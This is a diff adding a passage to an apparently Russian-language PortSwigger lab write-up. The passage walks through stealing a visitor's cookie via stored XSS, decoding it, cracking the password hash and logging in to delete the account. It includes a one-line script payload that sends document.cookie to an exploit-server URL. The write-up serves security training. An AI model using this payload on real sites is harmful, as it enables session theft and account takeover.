@@ -25,3 +25,27 @@
 ![PortSwigger](../Drawing/Drawing_35.png)
 
 
+Далее делаем нагрузку, которая крадет куки пользователей, посетивших данную страницу:
+
+`<script>document.location='https://exploit-0ae800cc04ab1cd68049027201ed0040.exploit-server.net/exploit'+document.cookie</script>`
+
+Заходим в логи сервера и видис IP:
+
+![PortSwigger](../Drawing/Drawing_36.png)
+
+Начинаем работать с куками данного стороннего IP-клиента...
+
+Декодировал скопированную куку и получил:
+
+![PortSwigger](../Drawing/Drawing_37.png)
+
+Пробую расхешировать пароль:
+
+![PortSwigger](../Drawing/Drawing_38.png)
+
+Попытка авторизоваться:
+Необходимо удалить учётку пользователя!
+
+![PortSwigger](../Drawing/Drawing_39.png)
+
+Успех!
